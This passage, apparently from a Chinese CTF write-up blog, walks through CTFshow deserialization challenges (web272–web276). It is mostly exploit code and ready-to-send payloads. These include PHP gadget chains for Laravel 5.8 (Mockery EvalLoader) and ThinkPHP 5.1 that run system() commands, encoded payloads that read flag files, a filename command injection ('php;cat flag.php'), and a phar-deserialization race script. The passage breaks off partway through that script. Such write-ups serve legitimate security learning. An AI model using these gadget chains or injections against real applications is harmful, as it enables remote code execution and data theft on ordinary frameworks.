class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">        <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">        <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">        <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">        <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A31%3A%22%3C%3Fphp+system%28%27cat+%2Ff%2A%27%29%3Bexit%3B%3F%3E%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burp抓包修改post值data=O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBus%<span class="number">5</span>CDispatcher%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>queueResolver%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CLoader%<span class="number">5</span>CEvalLoader%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>load%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A43%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CConsole%<span class="number">5</span>CQueuedCommand%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>connection%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockDefinition%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A37%<span class="number">3</span>A%<span class="number">22</span>PhpParser%<span class="number">5</span>CNode%<span class="number">5</span>CScalar%<span class="number">5</span>CMagicConst%<span class="number">5</span>CLine%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>cat+%<span class="number">2</span>Ff%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>Bexit%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web273-Larvel5-8"><a href="#web273-Larvel5-8" class="headerlink" title="web273(Larvel5.8)"></a>web273(Larvel5.8)</h1><ul><li>payload和上题一样</li></ul><h1 id="web274-ThinkPHP-V5-1"><a href="#web274-ThinkPHP-V5-1" class="headerlink" title="web274(ThinkPHP V5.1)"></a>web274(ThinkPHP V5.1)</h1><p>直接搜ThinkPHP V5.1</p><p>看源码发现提示<code>@unserialize(base64_decode(\$_GET[&#39;data&#39;]))</code></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//GET传参 shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shell&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;shell&#x27;</span> =&gt; []];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_pjax&#x27;</span> =&gt; <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&#x27;visible&#x27;</span> =&gt; [<span class="variable language_">$this</span>,<span class="string">&#x27;isPjax&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJzaGVsbCI7YTowOnt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToic2hlbGwiO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo3O2k6MTtzOjY6ImlzUGpheCI7fX1zOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9wamF4IjtzOjU6InNoZWxsIjt9fX19fX0=</span></span><br></pre></td></tr></table></figure><ul><li>传参的时候需要注意，除了要传data还要传一个上边代码标注的地方，内容是要执行的代码</li></ul><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJzaGVsbCI7YTowOnt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToic2hlbGwiO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo3O2k6MTtzOjY6ImlzUGpheCI7fX1zOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9wamF4IjtzOjU6InNoZWxsIjt9fX19fX0=&amp;shell=tac /f*</span><br></pre></td></tr></table></figure><h1 id="web275-rce"><a href="#web275-rce" class="headerlink" title="web275(rce)"></a>web275(rce)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?fn=php;cat flag.php</code></p><ul><li>发现有system，要想使其触发，evilfile值应为true</li><li>所以试着构造payload，<code>?fn=php;whoami</code>，发现可以rce</li></ul><h1 id="web276-phar反序列化-竞争"><a href="#web276-phar反序列化-竞争" class="headerlink" title="web276(phar反序列化+竞争)"></a>web276(phar反序列化+竞争)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>发现本题在执行命令的时候，又对admin的值进行判断，且admin的值无法控制</li><li>目的还是让命令执行</li><li><p>如果是phar协议，会对其进行反序列化操作</p></li><li><p>先生成一个phar包</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;1;cat f*&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><ul><li>创建完成后打开</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/276.png" alt=""></p><ul><li>需要写一个脚本进行get flag</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 读取phar包内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPhar</span>(<span class="params">phar</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(phar,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> p:</span><br><span class="line">        <span class="keyword">return</span> p.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 